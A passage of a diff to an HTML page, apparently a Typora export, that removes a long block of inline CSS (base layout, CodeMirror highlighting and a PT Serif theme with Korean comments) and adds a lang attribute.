@@ -1,961 +1,644 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'><style type='text/css'>html {overflow-x: initial !important;}</style>
-<style type='text/css'  id="style-base">:root { --bg-color: #ffffff; --text-color: #333333; --select-text-bg-color: #B5D6FC; --select-text-font-color: auto; --monospace: "Lucida Console",Consolas,"Courier",monospace; --title-bar-height: 20px; }
-.mac-os-11 { --title-bar-height: 28px; }
-html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, "Segoe UI Emoji", "SF Pro", sans-serif; -webkit-font-smoothing: antialiased; }
-h1, h2, h3, h4, h5 { white-space: pre-wrap; }
-body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; }
-iframe { margin: auto; }
-a.url { word-break: break-all; }
-a:active, a:hover { outline: 0px; }
-.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
-#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
-#write.first-line-indent p { text-indent: 2em; }
-#write.first-line-indent li p, #write.first-line-indent p *, #write.first-line-indent svg * { text-indent: 0px; }
-#write.first-line-indent li { margin-left: 2em; }
-.for-image #write { padding-left: 8px; padding-right: 8px; }
-body.typora-export { padding-left: 30px; padding-right: 30px; }
-.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
-.typora-export .task-list-item input { pointer-events: none; }
-@media screen and (max-width: 500px) {
-  body.typora-export { padding-left: 0px; padding-right: 0px; }
-  #write { padding-left: 20px; padding-right: 20px; }
-}
-#write li > figure:last-child { margin-bottom: 0.5rem; }
-#write ol, #write ul { position: relative; }
-img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
-button, input, select, textarea { color: inherit; font: inherit; }
-input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
-*, ::after, ::before { box-sizing: border-box; }
-#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; position: relative; }
-#write svg h1, #write svg h2, #write svg h3, #write svg h4, #write svg h5, #write svg h6, #write svg p { position: static; }
-.nodeLabel p { padding-right: 2px; padding-left: 2px; }
-.typora-export .nodeLabel p { padding-right: 0px; padding-left: 0px; }
-foreignobject { overflow: visible; }
-p { line-height: inherit; }
-h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
-p { orphans: 4; }
-li p { orphans: 1; }
-h1 { font-size: 2rem; }
-h2 { font-size: 1.8rem; }
-h3 { font-size: 1.6rem; }
-h4 { font-size: 1.4rem; }
-h5 { font-size: 1.2rem; }
-h6 { font-size: 1rem; }
-.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
-.hidden { display: none; }
-.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
-a { cursor: pointer; }
-sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
-sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
-#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
-figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
-figure > table { margin: 0px; }
-thead, tr { break-inside: avoid; break-after: auto; }
-thead { display: table-header-group; }
-table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
-table.md-table td { min-width: 32px; }
-.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
-.CodeMirror-linenumber { user-select: none; }
-.CodeMirror { text-align: left; }
-.CodeMirror-placeholder { opacity: 0.3; }
-.CodeMirror pre { padding: 0px 4px; }
-.CodeMirror-lines { padding: 0px; }
-div.hr:focus { cursor: none; }
-#write pre { white-space: pre-wrap; }
-#write.fences-no-line-wrapping pre { white-space: pre; }
-#write pre.ty-contain-cm { white-space: normal; }
-.CodeMirror-gutters { margin-right: 4px; }
-.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
-.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
-#write .md-fences.mock-cm { white-space: pre-wrap; }
-.md-fences.md-fences-with-lineno { padding-left: 0px; }
-#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
-.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
-.CodeMirror-line, twitterwidget { break-inside: avoid; }
-svg { break-inside: avoid; }
-.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
-.footnotes + .footnotes { margin-top: 0px; }
-.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
-li div { padding-top: 0px; }
-blockquote { margin: 1rem 0px; }
-li .mathjax-block, li p { margin: 0.5rem 0px; }
-li blockquote { margin: 1rem 0px; }
-li { margin: 0px; position: relative; }
-blockquote > :last-child { margin-bottom: 0px; }
-blockquote > :first-child, li > :first-child { margin-top: 0px; }
-.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
-#write .footnote-line { white-space: pre-wrap; }
-@media print {
-  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
-  #write { margin-top: 0px; border-color: transparent !important; padding-top: 0px !important; padding-bottom: 0px !important; }
-  .typora-export * { -webkit-print-color-adjust: exact; }
-  .typora-export #write { break-after: avoid; }
-  .typora-export #write::after { height: 0px; }
-  .is-mac table { break-inside: avoid; }
-  #write > p:nth-child(1) { margin-top: 0px; }
-  .typora-export-show-outline .typora-export-sidebar { display: none; }
-  figure { overflow-x: visible; }
-}
-.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
-a img, img a { cursor: pointer; }
-pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
-p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
-#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
-p > .md-image:only-child { display: inline-block; width: 100%; }
-#write .MathJax_Display { margin: 0.8em 0px 0px; }
-.md-math-block { width: 100%; }
-.md-math-block:not(:empty)::after { display: none; }
-.MathJax_ref { fill: currentcolor; }
-[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
-.md-task-list-item { position: relative; list-style-type: none; }
-.task-list-item.md-task-list-item { padding-left: 0px; }
-.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
-.math { font-size: 1rem; }
-.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
-.md-toc-content { position: relative; margin-left: 0px; }
-.md-toc-content::after, .md-toc::after { display: none; }
-.md-toc-item { display: block; color: rgb(65, 131, 196); }
-.md-toc-item a { text-decoration: none; }
-.md-toc-inner:hover { text-decoration: underline; }
-.md-toc-inner { display: inline-block; cursor: pointer; }
-.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
-.md-toc-h2 .md-toc-inner { margin-left: 2em; }
-.md-toc-h3 .md-toc-inner { margin-left: 4em; }
-.md-toc-h4 .md-toc-inner { margin-left: 6em; }
-.md-toc-h5 .md-toc-inner { margin-left: 8em; }
-.md-toc-h6 .md-toc-inner { margin-left: 10em; }
-@media screen and (max-width: 48em) {
-  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
-  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
-  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
-  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
-}
-a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
-.footnote-line a:not(.reversefootnote) { color: inherit; }
-.reversefootnote { font-family: ui-monospace, sans-serif; }
-.md-attr { display: none; }
-.md-fn-count::after { content: "."; }
-code, pre, samp, tt { font-family: var(--monospace); }
-kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
-.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
-code { text-align: left; vertical-align: initial; }
-a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
-.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
-.md-diagram-panel > svg { max-width: 100%; }
-[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
-[lang="mermaid"] .node text { font-size: 1rem; }
-table tr th { border-bottom: 0px; }
-video { max-width: 100%; display: block; margin: 0px auto; }
-iframe { max-width: 100%; width: 100%; border: none; }
-.highlight td, .highlight tr { border: 0px; }
-mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
-.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
-.md-expand mark .md-meta { opacity: 0.3 !important; }
-mark .md-meta { color: rgb(0, 0, 0); }
-@media print {
-  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
-}
-.md-diagram-panel .messageText { stroke: none !important; }
-.md-diagram-panel .start-state { fill: var(--node-fill); }
-.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
-.md-fences.md-fences-math { font-size: 1em; }
-.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
-.md-fences-advanced:not(.md-focus) { background: inherit; }
-.mermaid-svg { margin: auto; }
-.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
-.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
-.typora-export-show-outline #write { --webkit-flex: 2; flex: 2 1 0%; }
-.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
-@media screen and (max-width: 1024px) {
-  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
-}
-@media screen and (max-width: 800px) {
-  .typora-export-sidebar { display: none; }
-}
-.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; overflow-wrap: anywhere; }
-.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
-.outline-content strong { font-weight: 400; }
-.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
-.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
-.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
-.outline-expander:hover::before { content: ""; }
-.outline-h1 > .outline-item { padding-left: 0px; }
-.outline-h2 > .outline-item { padding-left: 1em; }
-.outline-h3 > .outline-item { padding-left: 2em; }
-.outline-h4 > .outline-item { padding-left: 3em; }
-.outline-h5 > .outline-item { padding-left: 4em; }
-.outline-h6 > .outline-item { padding-left: 5em; }
-.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
-.outline-label:hover { text-decoration: underline; }
-.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
-.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
-.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
-.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
-.outline-children { display: none; }
-.info-panel-tab-wrapper { display: none; }
-.outline-item-open > .outline-children { display: block; }
-.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
-.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
-.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
-.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
-.typora-export-collapse-outline .outline-children { display: none; }
-.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
-.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
-.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
-.md-inline-math-container mjx-container { zoom: 0.95; }
-mjx-container { break-inside: avoid; }
-.md-alert.md-alert-note { border-left-color: rgb(9, 105, 218); }
-.md-alert.md-alert-important { border-left-color: rgb(130, 80, 223); }
-.md-alert.md-alert-warning { border-left-color: rgb(154, 103, 0); }
-.md-alert.md-alert-tip { border-left-color: rgb(31, 136, 61); }
-.md-alert.md-alert-caution { border-left-color: rgb(207, 34, 46); }
-.md-alert { padding: 0px 1em; margin-bottom: 16px; color: inherit; border-left: 0.25em solid rgb(0, 0, 0); }
-.md-alert-text-note { color: rgb(9, 105, 218); }
-.md-alert-text-important { color: rgb(130, 80, 223); }
-.md-alert-text-warning { color: rgb(154, 103, 0); }
-.md-alert-text-tip { color: rgb(31, 136, 61); }
-.md-alert-text-caution { color: rgb(207, 34, 46); }
-.md-alert-text { font-size: 0.9rem; font-weight: 700; }
-.md-alert-text svg { fill: currentcolor; position: relative; top: 0.125em; margin-right: 1ch; overflow: visible; }
-.md-alert-text-container::after { content: attr(data-text); text-transform: capitalize; pointer-events: none; margin-right: 1ch; }
-
-</style>
-<style type='text/css'  id="style-codemirror">.CodeMirror { height: auto; }
-.CodeMirror.cm-s-inner { background: inherit; }
-.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
-.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
-.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
-.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
-.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
-.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
-.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
-.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
-.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
-.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
-.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
-.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
-.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
-.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
-.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
-.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
-.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
-.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
-.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
-.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
-.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
-.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
-.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
-.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
-.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
-.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
-.cm-negative { color: rgb(221, 68, 68); }
-.cm-positive { color: rgb(34, 153, 34); }
-.cm-header, .cm-strong { font-weight: 700; }
-.cm-del { text-decoration: line-through; }
-.cm-em { font-style: italic; }
-.cm-link { text-decoration: underline; }
-.cm-error { color: red; }
-.cm-invalidchar { color: red; }
-.cm-constant { color: rgb(38, 139, 210); }
-.cm-defined { color: rgb(181, 137, 0); }
-div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
-div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
-.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
-.CodeMirror { position: relative; overflow: hidden; }
-.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
-.CodeMirror-sizer { position: relative; }
-.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
-.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
-.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
-.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
-.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
-.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
-.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
-.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
-.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
-.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
-.CodeMirror-lines { cursor: text; }
-.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
-.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
-.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
-.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
-.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
-.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
-.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
-.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
-.CodeMirror-measure pre { position: static; }
-.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
-.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
-.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
-.cm-searching { background: rgba(255, 255, 0, 0.4); }
-span.cm-underlined { text-decoration: underline; }
-span.cm-strikethrough { text-decoration: line-through; }
-.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
-.cm-tw-deleted { text-decoration: line-through; }
-.cm-tw-header5 { font-weight: 700; }
-.cm-tw-listitem:first-child { padding-left: 10px; }
-.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
-.cm-tw-underline { text-decoration: underline; }
-@media print {
-  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
-}
-
-</style>
-<link rel='stylesheet' href='https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&amp;subset=latin,cyrillic-ext,cyrillic,latin-ext' type='text/css' />
-<style type='text/css'  id="style-theme_css">/* meyer reset -- http://meyerweb.com/eric/tools/css/reset/ , v2.0 | 20110126 | License: none (public domain) */
-
-@include-when-export url(https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext);
-
-/* =========== */
-
-/* pt-serif-regular - latin */
-/* pt-serif-italic - latin */
-/* pt-serif-700 - latin */
-/* pt-serif-700italic - latin */
-:root {
-  --active-file-bg-color: #dadada;
-  --active-file-bg-color: rgba(32, 43, 51, 0.63);
-  --active-file-text-color: white;
-  --bg-color: #f3f2ee;
-  --text-color: #1f0909;
-  --control-text-color: #444;
-  --rawblock-edit-panel-bd: #e5e5e5;
-
-  --select-text-bg-color: rgba(32, 43, 51, 0.63);
-  --select-text-font-color: white;
-}
-
-pre {
-  --select-text-bg-color: #36284e;
-  --select-text-font-color: #fff;
-}
-
-html {
-  font-size: 16px;
-  -webkit-font-smoothing: antialiased;
-}
-
-html,
-body {
-  background-color: #f3f2ee;
-  font-family: "PT Serif", "Times New Roman", Times, serif;
-  color: #1f0909;
-  line-height: 1.5em;
-}
-
-/*#write {
-	overflow-x: auto;
-    max-width: initial;
-	padding-left: calc(50% - 17em);
-    padding-right: calc(50% - 17em);
-}
-
-@media (max-width: 36em) {
- 	#write {
- 		padding-left: 1em;
-    	padding-right: 1em;
- 	}
-}*/
-
-/* #write {
-  max-width: 40em;
-} */
-
-/* @media only screen and (min-width: 1400px) {
-  #write {
-    max-width: 914px;
-  }
-} */
-
-/* 강제 적용 버전 */
-#write {
-  max-width: 900px !important; /* 숫자를 더 키워보세요 */
-  width: 90% !important;
-}
-
-@media only screen and (min-width: 1400px) {
-  #write {
-    max-width: 1400px !important;
-  }
-}
-
-ol li {
-  list-style-type: decimal;
-  list-style-position: outside;
-}
-ul li {
-  list-style-type: disc;
-  list-style-position: outside;
-}
-
-ol,
-ul {
-  list-style: none;
-}
-
-blockquote,
-q {
-  quotes: none;
-}
-blockquote:before,
-blockquote:after,
-q:before,
-q:after {
-  content: "";
-  content: none;
-}
-table {
-  border-collapse: collapse;
-  border-spacing: 0;
-}
-/* styles */
-
-/* ====== */
-
-/* headings */
-
-h1,
-h2,
-h3,
-h4,
-h5,
-h6 {
-  font-weight: bold;
-}
-h1 {
-  font-size: 1.875em;
-  /*30 / 16*/
-  line-height: 1.6em;
-  /* 48 / 30*/
-  margin-top: 2em;
-}
-h2,
-h3 {
-  font-size: 1.3125em;
-  /*21 / 16*/
-  line-height: 1.15;
-  /*24 / 21*/
-  margin-top: 2.285714em;
-  /*48 / 21*/
-  margin-bottom: 1.15em;
-  /*24 / 21*/
-}
-h3 {
-  font-weight: normal;
-}
-h4 {
-  font-size: 1.125em;
-  /*18 / 16*/
-  margin-top: 2.67em;
-  /*48 / 18*/
-}
-h5,
-h6 {
-  font-size: 1em;
-  /*16*/
-}
-h1 {
-  border-bottom: 1px solid;
-  margin-bottom: 1.875em;
-  padding-bottom: 0.8125em;
-}
-/* links */
-
-a {
-  text-decoration: none;
-  color: #065588;
-}
-a:hover,
-a:active {
-  text-decoration: underline;
-}
-/* block spacing */
-
-p,
-blockquote,
-.md-fences {
-  margin-bottom: 1.5em;
-}
-h1,
-h2,
-h3,
-h4,
-h5,
-h6 {
-  margin-bottom: 1.5em;
-}
-/* blockquote */
-
-blockquote {
-  font-style: italic;
-  border-left: 5px solid;
-  margin-left: 2em;
-  padding-left: 1em;
-}
-/* lists */
-
-ul,
-ol {
-  margin: 0 0 1.5em 1.5em;
-}
-/* tables */
-.md-meta,
-.md-before,
-.md-after {
-  color: #999;
-}
-
-table {
-  margin-bottom: 1.5em;
-  /*24 / 16*/
-  font-size: 1em;
-  /* width: 100%; */
-}
-thead th,
-tfoot th {
-  padding: 0.25em 0.25em 0.25em 0.4em;
-  text-transform: uppercase;
-}
-th {
-  text-align: left;
-}
-td {
-  vertical-align: top;
-  padding: 0.25em 0.25em 0.25em 0.4em;
-}
-
-code,
-.md-fences {
-  background-color: #dadada;
-}
-
-code {
-  padding-left: 2px;
-  padding-right: 2px;
-}
-
-.md-fences {
-  margin-left: 2em;
-  margin-bottom: 3em;
-  padding-left: 1ch;
-  padding-right: 1ch;
-  font-size: 0.8em;
-  margin-left: 0 !important;
-  width: 90% !important; /* 100%에서 95%로 살짝 줄임 */
-  max-width: 90% !important; /* 최대치 고정 */
-}
-
-pre,
-code,
-tt {
-  font-size: 0.875em;
-  line-height: 1.714285em;
-}
-/* some fixes */
-
-h1 {
-  line-height: 1.3em;
-  font-weight: normal;
-  margin-bottom: 0.5em;
-}
-
-p + ul,
-p + ol {
-  margin-top: 0.5em;
-}
-
-h3 + ul,
-h4 + ul,
-h5 + ul,
-h6 + ul,
-h3 + ol,
-h4 + ol,
-h5 + ol,
-h6 + ol {
-  margin-top: 0.5em;
-}
-
-li > ul,
-li > ol {
-  margin-top: inherit;
-  margin-bottom: 0;
-}
-
-li ol > li {
-  list-style-type: lower-alpha;
-}
-
-li li ol > li {
-  list-style-type: lower-roman;
-}
-
-h2,
-h3 {
-  margin-bottom: 0.75em;
-}
-hr {
-  border-top: none;
-  border-right: none;
-  border-bottom: 1px solid;
-  border-left: none;
-}
-h1 {
-  border-color: #c5c5c5;
-}
-blockquote {
-  border-color: #bababa;
-  color: #656565;
-}
-
-blockquote ul,
-blockquote ol {
-  margin-left: 0;
-}
-
-.ty-table-edit {
-  background-color: transparent;
-}
-thead {
-  background-color: #dadada;
-}
-tr:nth-child(even) {
-  background: #e8e7e7;
-}
-hr {
-  border-color: #c5c5c5;
-}
-.task-list {
-  padding-left: 1rem;
-}
-
-.md-task-list-item {
-  padding-left: 1.5rem;
-  list-style-type: none;
-}
-
-.md-task-list-item > input:before {
-  content: "\221A";
-  display: inline-block;
-  width: 1.25rem;
-  height: 1.6rem;
-  vertical-align: middle;
-  text-align: center;
-  color: #ddd;
-  background-color: #f3f2ee;
-}
-
-.md-task-list-item > input:checked:before,
-.md-task-list-item > input[checked]:before {
-  color: inherit;
-}
-
-#write pre.md-meta-block {
-  min-height: 1.875rem;
-  color: #555;
-  border: 0px;
-  background: transparent;
-  margin-top: -4px;
-  margin-left: 1em;
-  margin-top: 1em;
-}
-
-.md-image > .md-meta {
-  color: #9b5146;
-}
-
-.md-image > .md-meta {
-  font-family:
-    Menlo, "Ubuntu Mono", Consolas, "Courier New", "Microsoft Yahei",
-    "Hiragino Sans GB", "WenQuanYi Micro Hei", serif;
-}
-
-#write > h3.md-focus:before {
-  left: -1.5rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h4.md-focus:before {
-  left: -1.5rem;
-  top: 0.25rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h5.md-focus:before {
-  left: -1.5rem;
-  top: 0.3125rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h6.md-focus:before {
-  left: -1.5rem;
-  top: 0.3125rem;
-  color: #999;
-  border-color: #999;
-}
-
-.md-toc:focus .md-toc-content {
-  margin-top: 19px;
-}
-
-.md-toc-content:empty:before {
-  color: #065588;
-}
-.md-toc-item {
-  color: #065588;
-}
-#write div.md-toc-tooltip {
-  background-color: #f3f2ee;
-}
-
-#typora-sidebar {
-  background-color: #f3f2ee;
-  -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-}
-
-.pin-outline #typora-sidebar {
-  background: inherit;
-  box-shadow: none;
-  border-right: 1px dashed;
-}
-
-.pin-outline #typora-sidebar:hover .outline-title-wrapper {
-  border-left: 1px dashed;
-}
-
-.outline-item:hover {
-  background-color: #dadada;
-  border-left: 28px solid #dadada;
-  border-right: 18px solid #dadada;
-}
-
-.typora-node .outline-item:hover {
-  border-right: 28px solid #dadada;
-}
-
-.outline-expander:before {
-  content: "\f0da";
-  font-family: FontAwesome;
-  font-size: 14px;
-  top: 1px;
-}
-
-.outline-expander:hover:before,
-.outline-item-open > .outline-item > .outline-expander:before {
-  content: "\f0d7";
-}
-
-.modal-content {
-  background-color: #f3f2ee;
-}
-
-.auto-suggest-container ul li {
-  list-style-type: none;
-}
-
-/** UI for electron */
-
-.megamenu-menu,
-#top-titlebar,
-#top-titlebar *,
-.megamenu-content {
-  background: #f3f2ee;
-  color: #1f0909;
-}
-
-.megamenu-menu-header {
-  border-bottom: 1px dashed #202b33;
-}
-
-.megamenu-menu {
-  box-shadow: none;
-  border-right: 1px dashed;
-}
-
-header,
-.context-menu,
-.megamenu-content,
-footer {
-  font-family: "PT Serif", "Times New Roman", Times, serif;
-  color: #1f0909;
-}
-
-#megamenu-back-btn {
-  color: #1f0909;
-  border-color: #1f0909;
-}
-
-.megamenu-menu-header #megamenu-menu-header-title:before {
-  color: #1f0909;
-}
-
-.megamenu-menu-list li a:hover,
-.megamenu-menu-list li a.active {
-  color: inherit;
-  background-color: #e8e7df;
-}
-
-.long-btn:hover {
-  background-color: #e8e7df;
-}
-
-#recent-file-panel tbody tr:nth-child(2n-1) {
-  background-color: transparent !important;
-}
-
-.megamenu-menu-panel tbody tr:hover td:nth-child(2) {
-  color: inherit;
-}
-
-.megamenu-menu-panel .btn {
-  background-color: #d2d1d1;
-}
-
-.btn-default {
-  background-color: transparent;
-}
-
-.typora-sourceview-on #toggle-sourceview-btn,
-.ty-show-word-count #footer-word-count {
-  background: #c7c5c5;
-}
-
-#typora-quick-open {
